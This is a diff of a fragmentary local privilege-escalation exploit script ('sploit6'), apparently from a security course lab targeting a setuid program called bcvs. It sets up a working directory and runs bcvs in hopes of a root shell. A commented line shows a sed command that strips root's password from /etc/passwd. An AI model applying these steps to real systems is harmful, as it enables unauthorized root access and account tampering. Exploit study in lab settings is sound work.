@@ -19,7 +19,7 @@ mkdir -p sploit6_dir
 cd sploit6_dir
 mkdir -p .bcvs
 touch .bcvs/block.list
-
+touch .bcvs/blah
 ## Saving some stuff for later
 # Following will give the root user no password
 # cat /etc/passwd | sed 's/root:[^:]*:\(.*\)/root::\1/'
@@ -39,6 +39,6 @@ echo ${PATH}
 echo "junk" > "dummy_input"
 
 #/usr/bin/gdb --args /opt/bcvs/bcvs co test.c
-/opt/bcvs/bcvs co test.c < dummy_input
+/opt/bcvs/bcvs co blah < dummy_input
 #/usr/bin/gdb -ex "set args co test.c < dummy_input" /opt/bcvs/bcvs
 # And then hopefully you have a root shell at this point
